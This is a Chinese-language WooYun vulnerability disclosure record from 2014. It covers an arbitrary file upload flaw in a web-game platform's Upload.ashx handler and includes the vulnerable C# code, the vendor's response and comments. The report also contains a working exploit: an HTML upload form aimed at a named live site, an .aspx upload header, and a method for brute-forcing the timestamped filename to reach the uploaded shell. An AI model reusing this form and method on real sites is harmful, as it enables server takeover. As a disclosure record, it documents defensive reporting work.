{"id": 4950, "wybug_id": "wooyun-2014-048516", "wybug_title": "信游科技页游平台程序通用型文件上传，可攻陷多个主流网页游戏平台", "wybug_corp": "52xinyou.cn", "wybug_author": "wefgod", "wybug_date": "2014-01-10 20:46", "wybug_open_date": "2014-04-10 20:46", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件上传", "文件上传内容未检查", "文件上传漏洞", "代码审计"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-01-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-01-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-01-17：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-03-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-03-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-03-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-04-10：\t细节向公众公开  简要描述： 上一发：http://www.wooyun.org/bugs/wooyun-2014-048510但是为啥给走小厂商流程了，http://www.wooyun.org/bugs/wooyun-2014-047997  这哥们的还漏洞预警了……@疯狗 狗哥帮忙！ 详细说明：  官方案例：http://52xinyou.cn/anli.htm从案例里面选了12玩 http://www.12wan.com 做例子，其它雷同（个别有狗）api里的upload.ashx文件产生的问题。   漏洞证明：  地址：http://www.12wan.com/api/Upload.ashx\n……        extTable.Add(\"image\", \"gif,jpg,jpeg,png,bmp\");        extTable.Add(\"flash\", \"swf,flv\");        extTable.Add(\"apw\", \"apw\");        extTable.Add(\"media\", \"swf,flv,mp3,mp4,wav,wma,wmv,mid,avi,mpg,asf,rm,rmvb\");        extTable.Add(\"file\", \"cs,doc,ppt,pptx,docx,xls,xlsx,ppt,htm,html,txt,zip,rar,gz,bz2,dll,exe,dbo,oleb\");        HttpPostedFile file = context.Request.Files[\"Filedata\"];        string _folder = context.Server.MapPath(context.Request[\"folder\"]);        String fileExt = Path.GetExtension(file.FileName).ToLower();        string uploadPath = context.Server.MapPath(\"~/upload\") + \"\\\\\";        bool nodate = false;        bool wname = false;        string folder = \"\";        if (Array.IndexOf(((String)extTable[\"image\"]).Split(','), fileExt.Substring(1).ToLower()) != -1)        {            folder = \"image\";        }        …………//如果以上后缀都对不上的话，直接命名文件夹为other        else        {            folder = \"other\";        }        if (nodate)        {            uploadPath += folder;        }        else        {            uploadPath += folder + \"\\\\\" + Utility.NowTime.ToString(\"yyyyMMdd\", DateTimeFormatInfo.InvariantInfo);        }        if (file != null)        {            if (!Directory.Exists(uploadPath))            {                Directory.CreateDirectory(uploadPath);            }//最后拼凑路径的时候直接使用了file.FileName没有重命名！             var fname = uploadPath + \"\\\\\" + Utility.NowTime.ToString(\"HHmmss\", DateTimeFormatInfo.InvariantInfo) + file.FileName;            file.SaveAs(fname);            if (wname)            {                context.Response.Write(fname);            }            else            {                context.Response.Write(\"0\");            }                    }\n也就是说文件后缀其实毫无限制。而且路径还是可猜测的！具体利用（要点小技巧）：Html利用代码：<html><form action=\"http://www.12wan.com/api/Upload.ashx\" name=\"test\" method=\"post\" enctype=\"multipart/form-data\"><input type=\"file\" name=\"Filedata\" size=\"23\" id=\"file\" /><input type=\"submit\" value=\"Submit\" /></form></html>Content-Disposition: form-data; name=\"Filedata\"; filename=\"a.aspx\"Filename处要小心，可能会带入如c:等路径会导致出错上传之后会显示：\n\n没有执行context.Response.Write(fname);直接将路径回显怎么办？前面有一个Utility.NowTime.ToString(\"HHmmss\", DateTimeFormatInfo.InvariantInfo)拼接到了用户名前面怎么办？仔细看Utility.NowTime.ToString(\"HHmmss\", DateTimeFormatInfo.InvariantInfo)HHmmss，意思就是说两位小时数、两位分、两位秒，好办了吧？看看当前时间：\n\n1933xx，大不了我们就从190000开始暴力破解吗，再看看文件夹路径Utility.NowTime.ToString(\"yyyyMMdd\", DateTimeFormatInfo.InvariantInfo);简单，如 20140110好，拼接第一个链接先：http://www.12wan.com/upload/other/20140110/190000a.aspx上神器：\n\n设置payload\n\n\n\n开打！\n\n200了，找到路径\n\n成功进入服务器。   修复方案：   var fname = uploadPath + \"\\\\\" + Utility.NowTime.ToString(\"HHmmss\", DateTimeFormatInfo.InvariantInfo) + file.FileName;后面file.FileName采用随机化的文件名并注意使用后缀的白名单，只限定指定类型的文件可以上传！其它一律禁止！另外厂商据说会给奖励啊？   版权声明：转载请注明来源 wefgod@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2014-01-14 11:52 厂商回复： 已经认领  这个系统是老版本系统  公开前会被淘汰  但是非常感激提出漏洞的白帽子们  已经联系乌云官方  准备做次活动  具体请留意官方公告  再次感谢 礼物已送 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-01-10 21:20 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  mark    \n     2014-01-10 21:21 |    \t\t绝情刀 \t\t\t( 普通白帽子  |\t\t\t        Rank:132 漏洞数:24        | .)\t\t \n  mark    \n     2014-01-10 23:45 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  已交由第三方厂商(cncert国家互联网应急中心)处理？ @xsser @疯狗 话说厂商在这啊，为什么转cert去了？厂商是 @信游科技页游    \n     2014-01-11 14:41 |    \t\t绝情刀 \t\t\t( 普通白帽子  |\t\t\t        Rank:132 漏洞数:24        | .)\t\t \n  @wefgod 我了个去，你的洞真的是无处安家的赶脚啊。    \n     2014-01-11 21:18 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @绝情刀 大牛过奖了吧……没那么严重了    \n     2014-01-11 22:10 |    \t\t绝情刀 \t\t\t( 普通白帽子  |\t\t\t        Rank:132 漏洞数:24        | .)\t\t \n  @wefgod 插，你叫我大牛...大牛cncert有一点好处就是rank一定会有的。    \n     2014-01-11 23:25 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @绝情刀 cert总的来说在所有厂商里面是给rank算比较公平的了    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}